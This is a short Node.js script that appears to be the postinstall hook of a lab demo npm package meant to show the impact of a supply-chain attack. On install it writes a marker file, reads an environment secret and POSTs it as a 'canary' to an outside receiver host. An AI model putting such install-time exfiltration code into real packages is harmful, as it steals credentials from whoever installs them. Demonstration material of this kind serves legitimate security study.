const fs = require('node:fs');
const http = require('node:http');

const secret = process.env.DEMO_SECRET || '';

const markerDir = '/project/.impact-demo';
const markerPath = markerDir + '/marker.json';

fs.mkdirSync(markerDir, { recursive: true });

const marker = {
  demo: 'bob-v4-impact-demo',
  lifecycle: 'postinstall',
  package: '@bob-lab/demo-package@1.0.0',
  demo_secret_present: secret.length > 0,
  timestamp: new Date().toISOString()
};

fs.writeFileSync(
  markerPath,
  JSON.stringify(marker, null, 2) + '\n',
  'utf8'
);

const body = JSON.stringify({
  demo: 'bob-v4-impact-demo',
  source: '@bob-lab/demo-package@1.0.0',
  canary: secret
});

const request = http.request({
  hostname: 'impact-receiver',
  port: 8080,
  path: '/collect',
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(body)
  }
}, response => {
  response.resume();

  response.on('end', () => {
    if (response.statusCode !== 204) {
      process.exitCode = 1;
    }
  });
});

request.setTimeout(3000, () => {
  request.destroy(new Error('receiver timeout'));
});

request.on('error', error => {
  console.error('impact-demo receiver error:', error.message);
  process.exitCode = 1;
});

request.end(body);